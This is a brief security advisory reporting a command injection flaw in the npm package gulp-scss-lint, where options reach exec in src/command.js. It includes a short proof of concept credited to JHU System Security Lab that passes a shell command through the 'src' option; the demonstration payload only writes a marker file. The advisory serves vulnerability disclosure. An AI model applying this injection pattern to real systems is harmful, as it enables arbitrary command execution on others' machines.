# Overview
`gulp-scss-lint` is a Lint for your .scss files, this package is vulnerable to Command Injection.

It is possible to inject arbitrary commands to the exec function located in `src/command.js` via the provided options.

# Proof of Concept by JHU System Security Lab
```
var root = require("gulp-scss-lint");
var attack_code = "echo vulnerable > create.txt";
var opt = {
  "src": attack_code
}
root(opt);
```